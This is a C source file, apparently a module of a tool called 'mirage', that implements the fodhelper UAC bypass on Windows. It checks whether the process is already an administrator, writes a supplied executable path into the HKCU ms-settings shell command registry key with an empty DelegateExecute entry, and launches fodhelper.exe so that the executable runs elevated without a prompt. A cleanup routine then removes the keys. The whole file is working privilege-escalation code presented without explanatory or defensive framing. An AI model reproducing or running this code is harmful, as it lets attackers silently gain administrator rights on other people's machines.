#include "uac_bypass.h"
#include "config.h"
#include "engine.h"

#ifdef ENABLE_UAC_BYPASS
#include "peb.h"
#include "hash.h"
#include "nt_types.h"
#include <windows.h>
#include <string.h>

/* ── isElevated ───────────────────────────────────────────── */

int mirage_is_elevated(void) {
    BOOL is_admin = FALSE;
    PSID admin_group = NULL;
    SID_IDENTIFIER_AUTHORITY nt_authority = {SECURITY_NT_AUTHORITY};
    
    if (AllocateAndInitializeSid(&nt_authority, 2, SECURITY_BUILTIN_DOMAIN_RID,
                                 DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &admin_group)) {
        CheckTokenMembership(NULL, admin_group, &is_admin);
        FreeSid(admin_group);
    }
    return is_admin ? 1 : 0;
}

/* ── fodhelper UAC bypass ──────────────────────────────────── */

int mirage_uac_bypass(const char *exe_path) {
    if (mirage_is_elevated()) return 0;
    
    /* Create registry key: HKCU\Software\Classes\ms-settings\Shell\Open\Command */
    HKEY hKey;
    LONG result = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\Open\\Command",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result != ERROR_SUCCESS) return -1;
    
    /* Set default value to our executable */
    WCHAR wpath[1024];
    int wlen = MultiByteToWideChar(CP_UTF8, 0, exe_path, -1, wpath, 1024);
    if (wlen <= 0 || wlen > 1024) { RegCloseKey(hKey); return -1; }
    
    result = RegSetValueExW(hKey, L"", 0, REG_SZ, (BYTE*)wpath,
                            (DWORD)(wlen * sizeof(WCHAR)));
    RegCloseKey(hKey);
    if (result != ERROR_SUCCESS) return -1;
    
    /* Set DelegateExecute to empty */
    result = RegCreateKeyExW(
        HKEY_CURRENT_USER,
        L"Software\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute",
        0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (result == ERROR_SUCCESS) RegCloseKey(hKey);
    
    /* Launch fodhelper.exe to trigger UAC bypass */
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    if (CreateProcessW(L"C:\\Windows\\System32\\fodhelper.exe", NULL,
                      NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    
    return 0;
}

/* ── cleanup ───────────────────────────────────────────────── */

int mirage_uac_cleanup(void) {
    RegDeleteKeyW(HKEY_CURRENT_USER,
                  L"Software\\Classes\\ms-settings\\Shell\\Open\\Command\\DelegateExecute");
    RegDeleteKeyW(HKEY_CURRENT_USER,
                  L"Software\\Classes\\ms-settings\\Shell\\Open\\Command");
    return 0;
}

#endif /* ENABLE_UAC_BYPASS */
